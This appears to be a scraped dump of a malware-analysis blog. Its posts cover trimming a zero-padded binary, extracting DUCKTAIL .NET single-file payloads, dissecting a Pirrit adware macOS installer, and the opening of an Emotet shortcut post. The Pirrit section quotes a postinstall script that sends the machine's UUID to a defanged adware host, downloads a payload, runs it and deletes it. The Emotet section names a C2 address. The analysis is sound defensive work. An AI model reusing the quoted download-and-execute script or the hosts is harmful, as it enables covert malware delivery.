0000 0000 0000 0000 0000 0000 0000 ................13222d40: 0000 0000 0000 0000 0000 0000 0000 0000 ................13222d50: 0000 0000 0000 0000 0000 0000 0000 0000 ................13222d60: 0000 0000 0000 0000 0000 0000 0000 0000 ................13222d70: 0000 0000 0000 0000 0000 0000 0000 0000 ................In addition, we can get some extra verification that the garbage data is zero-filled by performing an entropy measure. Shannon entropy measures the “randomness” of bytes in a file. Scores approaching 7.9 - 8.0 are usually encrypted, 5.0 - 7.0ish are usually compressed, and extremely low values indicate a lot of repeating data in a file. We can perform a simple entropy measure using diec.remnux@remnux:~/cases/heavyweight$ diec --entropy GoogleDrive.exe Total 0.0212382: not packed 0|PE Header|0|1024|2.2973: not packed 1|Section(0)[&#39;.text&#39;]|1024|200192|6.11761: not packed 2|Section(1)[&#39;.data&#39;]|201216|192000|7.70243: packed 3|Section(2)[&#39;.rsrc&#39;]|393216|40960|5.76035: not packed 4|Overlay|434176|320572800|4.50037e-09: not packedThe total entropy of the 300 MB binary is 0.02, which indicates there is a lot of repeated data in the file. Specifically looking the last row of output for an “Overlay”, the specific entropy for that portion is 0.00000000450037 (converted from scientific notation). This is a ridiculously low entropy value, and it indicates the data in that overlay portion appended to the binary is likely all a single value: zeroes.Working hard for that weight loss with pecheckThankfully we don’t have to count calories to get this binary down to size! This post from Didier Stevens for SANS got me on track to using pecheck for lowering binary size. If you’re dealing with a signed, heavy binary, I highly recommend reading that post for the extra parts on removing the signature as well as the zeroes. To get this specific binary down to a manageable size, we can take a couple easy steps:remnux@remnux:~/cases/heavyweight$ pecheck GoogleDrive.exe PE check for &#39;GoogleDrive.exe&#39;:Entropy: 0.021238 (Min=0.0, Max=8.0)Size: 321006976MD5 hash: 7a35755f3d17f119d7138c602a5842d1SHA-1 hash: 632b2b4dcd42f45c8dc8108886319d93c01ac48dSHA-256 hash: 218efc289854e3ef9086e9c3db36cf627d2171ceaece2c26085250c6203b31cdSHA-512 hash: b7ede71413fe28c4aa44aba4527150f077fbb5a1f123e2f8b777c80a71b1408b8ce9acce70688d8b0f9ff2d92c6502ac232ce0483b597a274246d32cce4aee1c.text entropy: 6.117600 (Min=0.0, Max=8.0).data entropy: 7.702422 (Min=0.0, Max=8.0).rsrc entropy: 5.760316 (Min=0.0, Max=8.0)Dump Info:----------Parsing Warnings----------Byte 0x00 makes up 99.8878% of the file&#39;s contents. This may indicate truncation / malformation....Overlay: Start offset: 0x0006a000 Size: 0x131b8d80 305.7 MB 99.86% MD5: a208289ffeff2be05f4489e9dfa9cd9e SHA-256: 80452ba8e588be2b7ed517c045403c7da638df0c02ac8d880330d7e41dc424e5 MAGIC: 00000000 .......Running pecheck with no options besides the binary name gives us confirmation that 305 MB of this file are all zeroes, and we can easily remove them with another pecheck command:remnux@remnux:~/cases/heavyweight$ pecheck -g s -D GoogleDrive.exe &amp;gt; lighter_GoogleDrive.exeremnux@remnux:~/cases/heavyweight$ exiftool lighter_GoogleDrive.exe ExifTool Version Number : 12.42File Name : lighter_GoogleDrive.exeDirectory : .File Size : 434 kBFile Modification Date/Time : 2022:10:15 16:24:47-04:00File Access Date/Time : 2022:10:15 16:23:15-04:00File Inode Change Date/Time : 2022:10:15 16:24:47-04:00File Permissions : -rw-rw-r--File Type : Win32 EXEFile Type Extension : exeMIME Type : application/octet-streamMachine Type : Intel 386 or later, and compatiblesTime Stamp : 2021:11:28 23:02:35-05:00Image File Characteristics : No relocs, Executable, 32-bitPE Type : PE32Linker Version : 9.0Code Size : 200192Initialized Data Size : 4456960Uninitialized Data Size : 0Entry Point : 0xabf0OS Version : 5.0Image Version : 0.0Subsystem Version : 5.0Subsystem : Windows GUIFile Version Number : 66.0.0.0Product Version Number : 4.0.0.0File Flags Mask : 0x003fFile Flags : (none)File OS : Windows NT 32-bitObject File Type : Executable applicationFile Subtype : 0The lighter_GoogleDrive.exe binary is much smaller than the original, and it’s still recognized as a Windows application. Now you can put the binary into sandboxes or any other analysis tools that have size limits! There’s just one caveat, as pointed out by David here:The downside is the file hash will change.So you may want to add a comment with the original hash before cleaning the null padding. ? 🤔&amp;mdash; David Ledbetter (@Ledtech3) October 13, 2022The file hash for the lighter sample will indeed change from that of the original sample because the data within the sample has changed. The functionality of the sample will stay the same, just the hashes will be different. If you’re sharing the lighter sample with others, be kind and consider sharing the original hashes of the heavier sample as well.Thanks for reading!" }, { "title": "Analyzing .NET Core Single File Samples (DUCKTAIL Case Study)", "url": "/analyzing-net-core-single-file-ducktail/", "categories": "malware", "tags": "malware, ducktail, .net-core", "date": "2022-08-07 00:00:00 +0000", "snippet": "This post is dedicated to my colleague Matt Graeber (@mattifestation) who showed me how to do the manual calculations and carving of PEs using CFF Explorer and a hex editor, making me think “there has to be a tool for this”. There are loads of ways to deploy .NET Framework applications, and I’ve mostly been familiar with just the traditional compile-and-run method. As .NET malware has evolved, adversaries have looked to use different deployment reasons for the same reason as legitimate developers. In some cases it’s easier, allows bundling files in different ways, or other reasons. One malware family named DUCKTAIL has recently embraced deployment in as a “.NET Single File” deployment feature. This feature is interesting in the sense that it allows a developer to deploy a .NET application to systems without requiring the systems to have a pre-deployed .NET Framework runtime installed. This dependency-free deployment is achieved by appending multiple binaries together into a single file, resulting in a large executable with multiple executables inside. In this post we’ll take a look at a DUCKTAIL sample and how the “single file” deployment choice affects malware analysis. The sample we’re working with is here in VT: https://www.virustotal.com/gui/file/740fd780b2b45c08d1abb45cddc6d1017c9fcc6bcce54fd8415d87a80d328ff6.Triaging the fileAs always, we can start out triaging the file using a combination of diec and pehash. First, let’s figure out the file type:remnux@remnux:~/cases/ducktail$ diec ducktail.exe PE32 Compiler: Microsoft Visual C/C++(-)[-] Linker: Microsoft Linker(14.29**)[GUI32,signed]Right off the bat, we can see our output is a little different than what we’d expect for a standard .NET Framework app. In this case we see diec says the file was compiled using Visual C/C++ instead of a .NET language like C# or VB. Usually for .NET apps, the output would look similar to this:PE32 Library: .NET(v4.0.30319)[-] Compiler: VB.NET(-)[-] Linker: Microsoft Linker(8.0)[GUI32]We know for sure we’re dealing with a Windows Portable Executable (PE) file, so let’s take a look at the import and rich header hashes. If you’re looking to get the imphash for a sample, you can easily do so with pehash. For the rich header hash, I like using the tool I made here that leverages the Python pefile library.remnux@remnux:~/cases/ducktail$ pehash ducktail.exe file filepath: ducktail.exe md5: 72840061e0f1b2f4bc373b5561970303 sha1: c773a6285a54183e792f23e499646f61d9b2f88f sha256: 740fd780b2b45c08d1abb45cddc6d1017c9fcc6bcce54fd8415d87a80d328ff6 ssdeep: 1572864:ha0XsmjPyZmtmuwKl7E2LmZBhbCV6ZE5GSQiOjEBkqYnIgJM0cAZv7SGdAcA689p:jjPyZxuwz+6y imphash: 34dc34e244a6f4378a06076ff16fc082remnux@remnux:~/cases/ducktail$ ./rhh-md5.py ducktail.exe e0f1735adef0e9f084efeaee57b351d2The imphash and rich header hash values are different that what I expect of traditional .NET malware. Usually, .NET executables have an import hash of f34d5f2d4577ed6d9ceec516c1f5a744 and .NET DLLs have an import hash of dae02f32a21e03ce65412f6e56942daa. In addition, .NET executables and DLLs usually don’t have rich header hashes. So this sample triages more like a native, unmanaged code binary than a .NET one.Digging deeper with exiftool and pedumpWe can get our first hints of the app being compiled as a .NET Core single file executable using exiftool and pedump.remnux@remnux:~/cases/ducktail$ exiftool ducktail.exe ExifTool Version Number : 12.42File Name : ducktail.exeDirectory : .File Size : 56 MBFile Modification Date/Time : 2022:08:07 21:14:35-04:00File Access Date/Time : 2022:08:07 21:15:11-04:00File Inode Change Date/Time : 2022:08:07 21:15:04-04:00File Permissions : -rw-rw-r--File Type : Win32 EXEFile Type Extension : exeMIME Type : application/octet-streamMachine Type : Intel 386 or later, and compatiblesTime Stamp : 2022:04:13 21:36:43-04:00Image File Characteristics : Executable, 32-bitPE Type : PE32Linker Version : 14.29Code Size : 233984Initialized Data Size : 331776Uninitialized Data Size : 0Entry Point : 0x2f8f0OS Version : 6.0Image Version : 0.0Subsystem Version : 6.0Subsystem : Windows GUIFile Version Number : 1.0.0.0Product Version Number : 1.0.0.0File Flags Mask : 0x003fFile Flags : (none)File OS : Win32Object File Type : Executable applicationFile Subtype : 0Language Code : NeutralCharacter Set : UnicodeCompany Name : DataExtractorFile Description : DataExtractorFile Version : 1.0.0.0Internal Name : DataExtractor.dllLegal Copyright : Original File Name : DataExtractor.dllProduct Name : DataExtractorProduct Version : 1.0.0Assembly Version : 1.0.0.0The file size is 56 MB. It’s not the beefiest binary ever, but it’s still pretty heavy and that can indicate multiple binaries in a single file. From here we can look at binary properties with pedump to get some more data. In the interest of brevity I’ve cut down the pedump output to just the exports since it contains the relevant bits.remnux@remnux:~/cases/ducktail$ pedump --exports ducktail.exe === EXPORTS ===# module &quot;singlefilehost.exe&quot;# flags=0x0 ts=&quot;2106-02-07 06:28:15&quot; version=0.0 ord_base=1# nFuncs=23 nNames=23 ORD ENTRY_VA NAME 1 21580 corehost_initialize 2 20ad0 corehost_load 3 20f20 corehost_main 4 21090 corehost_main_with_output_buffer 5 21960 corehost_resolve_component_dependencies 6 eba0 corehost_set_error_writer 7 218e0 corehost_unload 8 f260 hostfxr_close 9 e8d0 hostfxr_get_available_sdks a eaa0 hostfxr_get_native_search_directories b ef80 hostfxr_get_runtime_delegate c f190 hostfxr_get_runtime_properties d efd0 hostfxr_get_runtime_property_value e ed40 hostfxr_initialize_for_dotnet_command_line f ee70 hostfxr_initialize_for_runtime_config 10 e520 hostfxr_main 11 e3e0 hostfxr_main_bundle_startupinfo 12 e490 hostfxr_main_startupinfo 13 e5c0 hostfxr_resolve_sdk 14 e720 hostfxr_resolve_sdk2 15 ef10 hostfxr_run_app 16 eba0 hostfxr_set_error_writer 17 f130 hostfxr_set_runtime_property_value.NET core “single file” apps are multiple binaries appended to one another, right? Well, the first binary in the append chain has the responsibility of being a “.NET loader” that loads subsequent .NET resources (appended after the loader) into memory at runtime. Once the resources get loaded, the actual .NET app gets run. The export details seen here in pedump are from the .NET loader overhead itself, which results in some good predictability. The .NET core “single file” apps should usually have exports like corehost_initialize, corehost_load, and others.Getting the actual app/malwareWe’ve got our bearings a bit and we know from documentation that a “single file” app is just a bunch of binaries appended to each other. So, logically, we should be able to walk the file and extract all the PEs from it. We can do this using pecheck.py.remnux@remnux:~/cases/ducktail$ pecheck -l P ducktail.exe 1: 0x00000000 EXE 32-bit 0x0350a17f 72840061e0f1b2f4bc373b5561970303 0x0350a17f (EOF) b&#39;&#39; b&#39;singlefilehost.exe&#39;2: 0x0008a71c DLL 64-bit 0x0013e6cb d35f8c57d217a41dfc5e68bf25e5ecb1 0x0350a17f (EOF) b&#39;empty&#39; b&#39;clrcompression.dll&#39;3: 0x0013e6cc DLL 64-bit 0x0024687b e127d23181160e02391e628192b1d08a 0x0350a17f (EOF) b&#39;clrjit.dll&#39; b&#39;clrjit.dll&#39;4: 0x0024687c DLL 64-bit 0x00652623 99004b84b758edc90f90671221152667 0x0350a17f (EOF) b&#39;CoreCLR.dll&#39; b&#39;coreclr.dll&#39;5: 0x00652624 DLL 64-bit 0x007443c3 ea613da6eeb3f2968faa2d65dabadab1 0x0350a17f (EOF) b&#39;mscordaccore.dll&#39; b&#39;mscordac.dll&#39;6: 0x007443c4 DLL 32-bit 0x008655c3 e02613d1a6211eb1bfc8d15431acbd68 0x0350a17f (EOF) b&#39;&#39; b&#39;e_sqlite3.dll&#39;...24: 0x0087fbd0 DLL 32-bit 0x010aed77 d3cfe3422fb4d5a93c1cf9807debd230 0x0350a17f (EOF) b&#39;&#39; b&#39;System.Private.CoreLib.dll&#39;25: 0x010aed80 DLL 32-bit 0x0111d57f 4ef7d9040e94a8c3a9ede74a8f66a73f 0x0350a17f (EOF) b&#39;&#39; b&#39;Dapper.dll&#39;26: 0x0111d580 DLL 32-bit 0x0117b77f a660b3d199853c0b014812f39e46eaa8 0x0350a17f (EOF) b&#39;&#39; b&#39;HtmlAgilityPack.dll&#39;27: 0x0117b780 DLL 32-bit 0x011ce97f 2904b6192503177cf287f6ae23ed65d5 0x0350a17f (EOF) b&#39;&#39; b&#39;Microsoft.Data.Sqlite.dll&#39;28: 0x011ce980 DLL 32-bit 0x0135e57f 47d413a62176af3f801b9f6a1146e1a7 0x0350a17f (EOF) b&#39;&#39; b&#39;Newtonsoft.Json.dll&#39;29: 0x0135e580 DLL 32-bit 0x019a2f7f 6697ec4f0f13bed443f3b070cc4192df 0x0350a17f (EOF) b&#39;&#39; b&#39;BouncyCastle.Crypto.dll&#39;30: 0x019a2f80 DLL 32-bit 0x019a4b7f 9b59e64ef76c1a543983b8dcb1ce8d75 0x0350a17f (EOF) b&#39;&#39; b&#39;SQLitePCLRaw.batteries_v2.dll&#39;31: 0x019a4b80 DLL 32-bit 0x019a637f 8b477db107c8ac8c219d90d94d93aaa4 0x0350a17f (EOF) b&#39;&#39; b&#39;SQLitePCLRaw.nativelibrary.dll&#39;32: 0x019a6380 DLL 32-bit 0x019ba57f 5bacb4c47e3ba56dd53cf88781bb4e05 0x0350a17f (EOF) b&#39;&#39; b&#39;SQLitePCLRaw.core.dll&#39;33: 0x019ba580 DLL 32-bit 0x019d077f 7a9ca8439b58afd87f4faec21968c087 0x0350a17f (EOF) b&#39;&#39; b&#39;SQLitePCLRaw.provider.dynamic_cdecl.dll&#39;34: 0x019d0780 DLL 32-bit 0x019d837f 5b015246ff6883063438c8ecf4af101e 0x0350a17f (EOF) b&#39;&#39; b&#39;System.Security.Cryptography.ProtectedData.dll&#39;35: 0x019d8380 DLL 32-bit 0x01a3417f ed5bdc648cba3d82edd0b14bed18b931 0x0350a17f (EOF) b&#39;&#39; b&#39;Telegram.Bot.dll&#39;36: 0x01a34180 DLL 32-bit 0x01aa217f 6a62b196160d1a477effa8e07ae48533 0x0350a17f (EOF) b&#39;&#39; b&#39;DataExtractor.dll&#39;37: 0x01aa2180 DLL 32-bit 0x01b7bb7f 0b360b2e48ad740b2045c96c228d8dfa 0x0350a17f (EOF) b&#39;&#39; b&#39;Microsoft.CSharp.dll&#39;...92: 0x03459580 DLL 32-bit 0x034c917f 6d306c25b62c2422a8411315307f5bf5 0x0350a17f (EOF) b&#39;&#39; b&#39;System.Text.RegularExpressions.dll&#39;93: 0x034c9180 DLL 32-bit 0x034e0b7f 21fef48538579c3d2533532c4b143e75 0x0350a17f (EOF) b&#39;&#39; b&#39;System.Threading.Channels.dll&#39;94: 0x034e0b80 DLL 32-bit 0x034f037f e58c38c4e4bfc5151c0f1ff350bfe6b7 0x0350a17f (EOF) b&#39;&#39; b&#39;System.Threading.dll&#39;Using pecheck with arguments to list the available PEs in the file reveals a whopping 94 different PE files within the single original ducktail.exe sample. Thankfully, there are only a couple of PEs here that are interesting to us: 35/Telegram.Bot.dll and 36/DataExtractor.dll. We can extract those with pecheck as well!remnux@remnux:~/cases/ducktail$ pecheck -l 35 -g s -D ducktail.exe &amp;gt; Telegram.Bot.dllremnux@remnux:~/cases/ducktail$ diec Telegram.Bot.dll PE32 Library: .NET(v4.0.30319)[-]remnux@remnux:~/cases/ducktail$ pecheck -l 36 -g s -D ducktail.exe &amp;gt; DataExtractor.dllremnux@remnux:~/cases/ducktail$ diec DataExtractor.dll PE32 Library: .NET(v4.0.30319)[-]Excellent, we’ve successfully extracted the actual DUCKTAIL .NET code from its “single file” container!Decompilation and further stepsDecompiling is a breeze with this sample thanks to ilspycmd. Lately I’ve been using it with command line arguments to export code as a .NET project so I can get extra details in there like the icon used by the malware.remnux@remnux:~/cases/ducktail$ mkdir ducktail-srcremnux@remnux:~/cases/ducktail$ ilspycmd -p -o ./ducktail-src/ DataExtractor.dll remnux@remnux:~/cases/ducktail$ mkdir telegrambot-srcremnux@remnux:~/cases/ducktail$ ilspycmd -p -o ./telegrambot-src/ Telegram.Bot.dll remnux@remnux:~/cases/ducktail$ tree -a ducktail-src/ducktail-src/├── app.ico├── cnData\\Core\\Models\\Json│   └── DataJsonModel.cs├── CokiWin\\Core\\Models\\Json\\BusinessJsonModel│   ├── Adaccount_Permissions.cs│   ├── BusinessJsonModel.cs│   ├── Clients.cs│   ├── Cursors1.cs│   ├── Cursors.cs│   ├── Datum1.cs│   ├── Datum.cs│   ├── Paging1.cs│   └── Paging.cs├── DataExtractor│   └── Program.cs...From here, if you want to get into deeper analysis you can start with the Program.cs file and simply follow the flow of code to other files as relevant!" }, { "title": "Analyzing a Pirrit adware installer", "url": "/analyzing-pirrit-adware-installer/", "categories": "malware", "tags": "malware, pirrit, pkg, postinstall", "date": "2022-05-13 00:00:00 +0000", "snippet": "While Windows holds the largest market share on malware, macOS has its fair share of threats that mostly exist in an adware/grayware area. In this post I want to walk through how a Pirrit PKG file installer works. There are lots of more complex threats, but this is a good place to start if you’re just jumping into analysis. If you want to follow along at home, I’m working with this file in MalwareBazaar: https://bazaar.abuse.ch/sample/d39426dbceb54bba51587242f8101184df43cc23af7dc7b364ca2327e28e7825/.Triaging the installerFirst, we need to verify we’re looking at a macOS installer file. To do this, we can use file and diec.remnux@remnux:~/cases/pirrit$ file FlashPlayer_01.0.pkg FlashPlayer_01.0.pkg: xar archive compressed TOC: 4540, SHA-1 checksumremnux@remnux:~/cases/pirrit$ diec FlashPlayer_01.0.pkg Binary Archive: XARThe macOS pkg installer file format is a XAR archive, so the output from both utilities jives with what I would expect. From here we have to extract the installer material.Extracting the package contentsTo extract the package contents we can use bsdtar from the libarchive-tools Ubuntu Linux package. The usual tar utility doesn’t work for me, but the FreeBSD implementation in the package works.remnux@remnux:~/cases/pirrit$ mkdir extractedremnux@remnux:~/cases/pirrit$ bsdtar xvf FlashPlayer_01.0.pkg -C extracted/x Distributionx Resourcesx Resources/adobe_backgrounda.pngx Resources/en.lprojx Resources/en.lproj/iem.htmlx Resources/adobe_background.pngx base.pkgx base.pkg/Payloadx base.pkg/Bomx base.pkg/Scriptsx base.pkg/PackageInfoAfter successfully extracting the files to the “extracted” folder, we can browse around the installer file’s contents. The first step will be inspecting the extracted Distribution file.Inspecting DistributionThe Distribution file contains details to help define and control the installation experience, which may include multiple packages within a single PKG file. In most case, the file is easily viewed in a text editor.&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&amp;lt;installer-script minSpecVersion=&quot;1.000000&quot; authoringTool=&quot;com.apple.PackageMaker&quot; authoringToolVersion=&quot;3.0.3&quot; authoringToolBuild=&quot;174&quot;&amp;gt; &amp;lt;title&amp;gt;Install Wizz&amp;lt;/title&amp;gt; &amp;lt;options customize=&quot;never&quot; allow-external-scripts=&quot;no&quot;/&amp;gt; &amp;lt;domains enable_anywhere=&quot;true&quot;/&amp;gt; &amp;lt;installation-check script=&quot;pm_install_check();&quot;/&amp;gt; &amp;lt;script&amp;gt;function pm_install_check() { if(!(system.compareVersions(system.version.ProductVersion,&#39;10.5&#39;) &amp;gt;= 0)) { my.result.title = &#39;Failure&#39;; my.result.message = &#39;You need at least Mac OS X 10.5 to install Install Wizz products.&#39;; my.result.type = &#39;Fatal&#39;; return false; } return true;}&amp;lt;/script&amp;gt; &amp;lt;background file=&quot;adobe_backgrounda.png&quot; alignment=&quot;left&quot; scaling=&quot;none&quot;/&amp;gt; &amp;lt;welcome file=&quot;iem.html&quot;/&amp;gt; &amp;lt;choices-outline&amp;gt; &amp;lt;line choice=&quot;choice1&quot;/&amp;gt; &amp;lt;/choices-outline&amp;gt; &amp;lt;choice id=&quot;choice1&quot; title=&quot;base&quot;&amp;gt; &amp;lt;pkg-ref id=&quot;com.InstallWizz.base.pkg&quot;/&amp;gt; &amp;lt;/choice&amp;gt; &amp;lt;pkg-ref id=&quot;com.InstallWizz.base.pkg&quot; installKBytes=&quot;200&quot; version=&quot;2.2.5&quot; auth=&quot;&quot;&amp;gt;#base.pkg&amp;lt;/pkg-ref&amp;gt;&amp;lt;/installer-script&amp;gt;The installer-script tag gives some metadata regarding what tools created the installer file. In this case it looks like the authors possibly used PackageMaker 3.0.3. This metadata is possibly arbitrary because I’ve encountered Distribution files that don’t have it inside. The next interesting thing is the chunk of JavaScript code contained within the script tag and called by the installation-check tag. In this code, the developer defined a pm_install_check() which determines the current system’s macOS version using system.version.ProductVersion. The version number is compared to 10.5 and the installation will only proceed if the version is later than that version. If the macOS version is older than Snow Leopard, the installation fails.Finally, the Distribution file references a base.pkg package that will be applied to the system during installation. We saw some references to base.pkg during extraction, so let’s go check that out.Examining base.pkgGetting a directory listing for base.pkg, we can see a few files.remnux@remnux:~/cases/pirrit/extracted/base.pkg$ lltotal 24drwxr-xr-x 2 remnux remnux 4096 Apr 29 2017 ./drwxrwxr-x 4 remnux remnux 4096 May 13 20:30 ../-rw-r--r-- 1 remnux remnux 1022 Apr 29 2017 Bom-rw-r--r-- 1 remnux remnux 394 Apr 29 2017 PackageInfo-rw-r--r-- 1 remnux remnux 114 Apr 29 2017 Payload-rw-r--r-- 1 remnux remnux 697 Apr 29 2017 ScriptsThere are a few files here. First, Bom is a “bill of materials” file. This file is supposed to contain a list of files and things to touch during the installation and it doesn’t typically contain malicious code. One of the things on my “to-do” list is to write a tool I like to parse Bom files. The next interesting file is PackageInfo. This is a XML file that describes the contents of base.pkg.&amp;lt;pkg-info format-version=&quot;2&quot; identifier=&quot;com.DataTech.base.pkg&quot; version=&quot;1.3.0&quot; install-location=&quot;/&quot; auth=&quot;&quot;&amp;gt; &amp;lt;payload installKBytes=&quot;200&quot; numberOfFiles=&quot;2&quot;/&amp;gt; &amp;lt;scripts&amp;gt; &amp;lt;postinstall file=&quot;./postinstall&quot;/&amp;gt; &amp;lt;/scripts&amp;gt;&amp;lt;bundle-version&amp;gt; &amp;lt;bundle id=&quot;com.DataTech&quot; CFBundleIdentifier=&quot;com.DataTech&quot; path=&quot;./Applications/DataTech.app&quot; CFBundleVersion=&quot;1&quot;/&amp;gt;&amp;lt;/bundle-version&amp;gt;&amp;lt;/pkg-info&amp;gt;The payload tag has some metadata to show that the installed components are supposed to be 2 files totaling 200 KB in size. A payload size this small typically indicates that there isn’t much of any payload in the package at all, I’d expect there to be script content here rather than Mach-O binaries. The scripts tag specifies that we can expect a postinstall script to be present and execute during installation. In many cases you’ll also see a preinstall script. In legitimate installers these scripts are intended to prepare a system for installation and then clean up components afterward. In malicious installers, the scripts are usually used to establish persistence or download additional content.Let’s jump over to inspect the package payload.Extracting and analyzing any payloadsIn macOS PKG files, the “payload” and “script” contents are stored within archives that are compressed using cpio and gzip. We can extract any contents pretty easily on the Linux command line.remnux@remnux:~/cases/pirrit/extracted/base.pkg$ file Payload Payload: gzip compressed data, last modified: Sat Apr 29 21:30:57 2017, from Unix, original size modulo 2^32 512remnux@remnux:~/cases/pirrit/extracted/base.pkg$ cat Payload | gunzip | cpio -i1 blockremnux@remnux:~/cases/pirrit/extracted/base.pkg$ lltotal 28drwxr-xr-x 3 remnux remnux 4096 May 13 21:18 ./drwxrwxr-x 4 remnux remnux 4096 May 13 20:30 ../drwxr-xr-x 2 remnux remnux 4096 May 13 21:17 Applications/-rw-r--r-- 1 remnux remnux 1022 Apr 29 2017 Bom-rw-r--r-- 1 remnux remnux 394 Apr 29 2017 PackageInfo-rw-r--r-- 1 remnux remnux 114 Apr 29 2017 Payload-rw-r--r-- 1 remnux remnux 697 Apr 29 2017 Scriptsremnux@remnux:~/cases/pirrit/extracted/base.pkg$ tree -a Applications/Applications/0 directories, 0 filesThe only thing within the package’s Payloads archive was an Applications folder, and it didn’t contain anything else. We can do something similar for the Scripts archive.Extracting and analyzing any scriptsJust like with Payloads, we can extract the contents of Scripts.remnux@remnux:~/cases/pirrit/extracted/base.pkg$ cat Scripts | gunzip | cpio -i4 blocksremnux@remnux:~/cases/pirrit/extracted/base.pkg$ lltotal 56drwxr-xr-x 3 remnux remnux 4096 May 13 21:21 ./drwxrwxr-x 4 remnux remnux 4096 May 13 20:30 ../-rw-r--r-- 1 remnux remnux 36 May 13 21:21 66c1ffac-c020-4385-b6c8-a23192676f00-rw-r--r-- 1 remnux remnux 36 May 13 21:21 7d13cfd4-0ea8-423c-aaca-d9724d1ae3f4-rw-r--r-- 1 remnux remnux 36 May 13 21:21 8b84eaf8-a670-4cd9-b519-46725438c885-rw-r--r-- 1 remnux remnux 36 May 13 21:21 8d6b1599-5bd7-4043-918c-b67863e24970-rw-r--r-- 1 remnux remnux 36 May 13 21:21 a62f3b05-8125-4b5e-b035-e49985109b9adrwxr-xr-x 2 remnux remnux 4096 May 13 21:17 Applications/-rw-r--r-- 1 remnux remnux 1022 Apr 29 2017 Bom-rw-r--r-- 1 remnux remnux 36 May 13 21:21 c45eb9d2-0c19-44b3-bdc1-7f936567f746-rw-r--r-- 1 remnux remnux 394 Apr 29 2017 PackageInfo-rw-r--r-- 1 remnux remnux 114 Apr 29 2017 Payload-rwxr-xr-x 1 remnux remnux 756 May 13 21:21 postinstall*-rw-r--r-- 1 remnux remnux 697 Apr 29 2017 ScriptsThe Scripts archive contained multiple files that are named with GUIDs. Inside those files are GUID values that match the name of the file. They don’t seem to add anything to the experience here, so we can focus on the postinstall script itself.#!/bin/bashfunc_act(){ OS_Version=$(sw_vers -productVersion) mid=$(ioreg -rd1 -c IOPlatformExpertDevice | awk &#39;/IOPlatformUUID/ { split($0, line, &quot;\\&quot;&quot;); printf(&quot;%s\\n&quot;, line[4]); }&#39;) if [[ ${OS_Version} == *&quot;10.12&quot;* ]]; then /usr/bin/curl -s -L -o /var/tmp/act.tgz &quot;hxxp://c.firstinstallmac[.]club/is/cact?i=&quot;413cc336-95fb-4d47-aa10-d4f06f790e1c&quot;&amp;amp;ve=10.12&amp;amp;id=$mid&quot; else /usr/bin/curl -s -L -o /var/tmp/act.tgz &quot;hxxp://c.firstinstallmac[.]club/is/cact?i=&quot;413cc336-95fb-4d47-aa10-d4f06f790e1c&quot;&amp;amp;id=$mid&quot; fi tar -xzf /var/tmp/act.tgz -C /var/tmp /var/tmp/act/act &quot;2712c147-7e15-4366-80e0-4c7b98d780f0&quot; &quot;413cc336-95fb-4d47-aa10-d4f06f790e1c&quot; sleep 120 rm -rf /var/tmp/act/act rm -rf /var/tmp/act.tgz}func_act &amp;amp;The script defines a function func_act() which downloads and executes arbitrary content from a remote URL. The first few lines grab the macOS version using sw_vers and the affected system’s UUID using ioreg. If macOS version on the affected system is running 10.12 (Sierra) a specific parameter is added to the URL called by curl. No matter the version, however, the script downloads an act.tgz file from c.firstinstallmac[.]club and writes it to disk. The script then unpacks it to /var/tmp/act. Finally, the script executes the process /var/tmp/act/act, feeding some UID values to it as arguments before sleeping and then removing all the contents downloaded.After executing, the contents from postinstall should not exist on the affected system anymore.Script-only packagesThis installer package is an example of something I’ve seen across Pirrit and WizardUpdate adware families: script-only packages. In these cases, no actual binary content exists in the installer files, and all the executable content is downloaded via a script. I’m not really sure why developers do this, but I suspect it’s related to evading static signatures or allowing the adversary to distribute one single installer while the actual adware/malware downloaded can change out on demand.Masquerading as AdobeBefore stopping for the night, I want to cover something that is potentially concerning for victims and for legitimate software developers. In this instance of malware and many others, the developer masquerades the installer to pose as an Adobe product. This is seen in an HTML file displayed during the installation that claims to be associated with “Flash Player” and a background image using an Adobe logo.This is even potentially an avenue that developers can use to fight adware, because this stuff definitely isn’t associated with Adobe in any way. Thank you for reading!" }, { "title": "Shortcut to Emotet, an odd TTP change", "url": "/shortcut-to-emotet-ttp-change/", "categories": "malware", "tags": "malware, emotet, lnk", "date": "2022-04-24 00:00:00 +0000", "snippet": "The adversary behind Emotet made a really interesting TTP change around 4/22 to use Windows shortcut files, and it definitely got noticed by multiple researchers.#Emotet New TTPs 🚨[+] LNK with embedded VBScript[+] VBS stager:- Base64 encoded URLs X7- ServerXMLHTTP download Emotet &amp;gt; %TMP%- Exec with regsvr32- VBS file removed after the execLNK &amp;gt; CMD &amp;gt; findstr &amp;amp; Wscript &amp;gt; Regsvr32 &amp;gt; Regsvr32C2 server: 138.201.142[.]73:8080🔥 https://t.co/DHGHAMiAPX pic.twitter.com/0ans5nyI79&amp;mdash; Max_Malyutin (@Max_Mal_) April 23, 20222022-04-22 (Friday) - #Emotet #epoch4 malspam sent zipped Windows shorcut (.LNK). LNK didn&amp;#39;t work in my lab or online sandboxes. But the shortcut contains script that I copied into a .vbs file, which ran fine. LNK: https://t.co/zfiDZytclb VBS: https://t.co/PMKUrA7RIn pic.twitter.com/XiNbazHeY1&amp;mdash; Brad (@malware_traffic) April 22, 2022This TTP change is a bit odd but not entirely unexpected with Emotet. Since returning earlier in the year, the adversary behind Emotet has spent a significant amount of time experimenting with different deployment techniques until settling on Excel 4.0 macros. Previous iterations also explored APPX packages, experiments with PowerShell, and more. There’s no way to know if this TTP change will stay as part of Emotet’s rotation, but if it does it will help to understand how it works. In this post I want to walk through the latest change using the sample available in MalwareBazaar here: https://bazaar.abuse.ch/sample/082d5935271abf58419fb5e9de83996bd2f840152de595afa7d08e4b98b1d203/.Triaging the shortcutWe can easily get the first few details from the shortcut using a combination of diec, file, and exiftool. First, let’s confirm the shortcut is indeed a shortcut.remnux@remnux:~/cases/emotet$ file INV\\ 2022-04-22_1538\\,\\ US.doc.lnk INV 2022-04-22_1538, US.doc.lnk: MS Windows shortcut, Item id list present, Has Relative path, Has command line arguments, Icon number=134, ctime=Mon Jan 1 04:56:02 1601, mtime=Mon Jan 1 04:56:02 1601, atime=Mon Jan 1 04:56:02 1601, length=0, window=hideremnux@remnux:~/cases/emotet$ diec INV\\ 2022-04-22_1538\\,\\ US.doc.lnk Binary Format: Windows Shortcut (.LNK)It looks like both file and diec agree that we’re looking at a MS Windows LNK shortcut file. Now let’s parse that metadata using exiftool.remnux@remnux:~/cases/emotet$ exiftool INV\\ 2022-04-22_1538\\,\\ US.doc.lnk ExifTool Version Number : 12.30File Name : INV 2022-04-22_1538, 